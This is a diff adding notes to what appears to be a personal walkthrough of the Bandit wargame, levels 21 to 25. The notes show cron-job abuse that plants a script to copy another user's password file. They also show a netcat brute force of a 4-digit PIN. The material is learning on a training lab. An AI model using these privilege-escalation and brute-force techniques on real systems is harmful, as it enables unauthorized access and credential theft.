@@ -242,3 +242,69 @@ This is a classic privilege escalation concept in Linux.
 
 ---
 
+## Level 21 → 22
+**Goal:** Find password written by a cron job to a temp file
+**Commands:**
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+**What I learned:**
+The cron job ran as bandit22 every minute and wrote its password
+to a temp file with chmod 644 (world-readable). Even as bandit21,
+I could read it directly. Classic misconfigured cron job — a real
+privilege escalation technique used in actual pentests.
+
+---
+
+## Level 22 → 23
+**Goal:** Reverse-engineer a shell script to find where the password is hidden
+**Commands:**
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/<md5hash>
+
+**What I learned:**
+The script generated a filename by md5-hashing a predictable string
+containing the username. By replicating the exact command with
+bandit23 as the target, I computed the correct filename and read
+the password from it. Taught me to read and think through scripts
+rather than just run them blindly.
+
+---
+
+## Level 23 → 24
+**Goal:** Plant a shell script for a cron job to execute as bandit24
+**Commands:**
+mkdir /tmp/nilu24
+chmod 777 /tmp/nilu24
+echo '#!/bin/bash' > /tmp/nilu24/getpass.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/nilu24/password.txt' >> /tmp/nilu24/getpass.sh
+chmod 777 /tmp/nilu24/getpass.sh
+cp /tmp/nilu24/getpass.sh /var/spool/bandit24/foo/
+cat /tmp/nilu24/password.txt
+
+**What I learned:**
+The cron job executed any script owned by bandit23 inside
+/var/spool/bandit24/foo/ — running it AS bandit24. I wrote my
+first shell script to copy bandit24's password to a location
+I could read. This is cron job abuse for privilege escalation —
+a technique that appears constantly in real CTFs and pentests.
+
+---
+
+## Level 24 → 25
+**Goal:** Brute force a 4-digit PIN sent alongside the password to port 30002
+**Commands:**
+mkdir /tmp/nilu25
+for i in $(seq -w 0000 9999); do echo "<bandit24password> $i"; done | nc localhost 30002 | grep -v "Wrong"
+
+**What I learned:**
+A daemon on port 30002 needed the correct password + 4-digit PIN.
+Instead of making 10000 separate connections, I piped all combinations
+through a single netcat connection at once. grep -v "Wrong" filtered
+out all failed attempts, leaving only the success line with the password.
+Efficient brute forcing — one connection, 10000 payloads.
+
